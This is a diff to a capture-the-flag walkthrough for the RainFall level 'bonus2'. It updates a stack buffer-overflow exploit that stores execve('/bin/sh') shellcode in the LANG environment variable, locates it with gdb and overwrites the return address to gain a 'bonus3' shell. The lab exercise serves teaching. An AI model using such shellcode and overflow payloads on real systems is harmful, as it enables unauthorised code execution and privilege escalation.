@@ -211,12 +211,13 @@ bonus2@RainFall:~$ export LANG=$(python -c 'print("nl" + "\x90" * 10 + "\x6a\x0b
 (gdb) b *main+125
 (gdb) x/20s *((char**)environ)
 ...
-0xbfffff18:      "LANG=nl\220j\vX\231Rh//shh/bin\211\343\061\311\315\200" # this address changes always if environment values are changed
+0xbfffff0d:      "LANG=nl\220j\vX\231Rh//shh/bin\211\343\061\311\315\200" # this address changes always if environment values are changed
 ...
 ```
-Mind that env ```LANG``` can change depending on its length or value.
+Mind that env ```LANG``` address can change depending on its length, value or existing env table on machine.
+```0xbfffffb1 = 0xbfffff0d + 7 ~ 17```
 ```sh
-bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "A" * 23 + "\x21\xff\xff\xbf"')
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "A" * 23 + "\x1b\xff\xff\xbf"')
 Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB!���
 $ whoami
 bonus3
